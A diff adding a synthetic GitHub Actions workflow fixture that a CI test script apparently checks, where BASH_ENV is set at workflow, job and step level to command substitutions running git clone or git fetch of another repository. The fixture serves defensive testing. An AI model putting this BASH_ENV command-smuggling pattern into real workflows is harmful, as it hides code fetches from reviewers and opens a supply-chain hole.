@@ -1,0 +1,28 @@
+name: planted
+
+# A planted workflow (SPEC-034 A10): a clone and a fetch of another repository written outside a
+# run step's script, in a value a shell runs: `BASH_ENV`, which bash expands, running each command
+# it substitutes, before it runs a step's script, in the workflow's, a job's and a step's `env`.
+# The names are synthetic. scripts/tests/test_ci_workflows.py judges it; nothing runs it.
+on:
+  pull_request:
+    branches: [dev]
+
+permissions:
+  contents: read
+
+env:
+  BASH_ENV: $(git clone https://github.com/example-org/other-repository.git)
+
+jobs:
+  build:
+    runs-on: ubuntu-24.04
+    env:
+      BASH_ENV: $(git clone https://github.com/example-org/other-repository.git)
+    steps:
+      - run: echo ready
+        env:
+          BASH_ENV: $(git clone https://github.com/example-org/other-repository.git)
+      - run: echo ready
+        env:
+          BASH_ENV: $(git fetch https://github.com/example-org/other-repository.git main)
